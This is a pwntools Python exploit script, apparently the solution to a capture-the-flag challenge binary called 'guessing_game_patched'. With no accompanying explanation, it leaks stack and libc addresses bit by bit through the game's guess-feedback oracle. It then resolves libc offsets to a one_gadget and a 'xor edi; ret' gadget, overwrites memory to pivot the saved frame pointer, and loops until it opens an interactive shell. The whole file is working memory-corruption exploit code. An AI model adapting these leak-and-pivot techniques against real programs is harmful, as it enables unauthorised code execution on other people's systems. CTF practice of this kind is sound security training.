from pwn import *

exe = ELF("./guessing_game_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.arch = "amd64"
context.log_level = "info"
context.binary = exe


def check(p, index, value):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Value: ", str(value).encode())

    result = p.recvline()

    if b"Correct" in result:
        return 0

    return int(re.search(rb"\d+", result).group())


def finding_bits(p, index):
    base_wrong = check(p, index, 0)

    result = 0

    for i in range(64):
        current = 1 << i

        current_wrong = check(p, index, current)

        # Exact match
        if current_wrong == 0:
            return current

        if current_wrong < base_wrong:
            result |= current
    assert check(p, index, result) == 0

    return result


def write_attempted(p, value, solved):

    if (value & solved) != solved:
        return False

    for bit in range(64):
        if (value >> bit) & 1:
            check(p, bit, 0xffffffff)

    return True


def write_solved(p, value):

    required = (1 << 16) | (1 << 21)

    if (value & required) != required:
        return False

    for bit in range(64):
        if (value >> bit) & 1:
            finding_bits(p, bit)

    return True


def submit(p, new_rbp):
    p.sendlineafter(b"Choice: ", b"0")
    p.sendafter(b"impossible.\n", p64(new_rbp))


def exploit():

    p = process(exe.path)



    stack_leak = finding_bits(p, 16)

    attempted_addr = stack_leak - 0x48

    log.success(f"stack leak      : {stack_leak:#x}")
    log.success(f"attempted addr  : {attempted_addr:#x}")

    libc_leak = finding_bits(p, 21)

    libc.address = libc_leak - 0x29ca8

    log.success(f"libc leak       : {libc_leak:#x}")
    log.success(f"libc base       : {libc.address:#x}")

    one_gadget = libc.address + 0xddf83

    xor_edi_edi_ret = libc.address + 0xc8b09

    log.success(f"xor edi; ret    : {xor_edi_edi_ret:#x}")
    log.success(f"one gadget      : {one_gadget:#x}")

    if not write_solved(p, libc.address):
        log.failure("write_solved failed")
        p.close()
        return None

    if not write_attempted(
        p,
        xor_edi_edi_ret,
        libc.address
    ):
        log.failure("write_attempted failed")
        p.close()
        return None

    check(p, 16, one_gadget)

    submit(p,attempted_addr - 8)

    return p


def main():

    while True:

        p = exploit()

        if p is not None:
            break

        log.warning("exploit attempt failed, retrying...")

    p.interactive()


if __name__ == "__main__":
    main()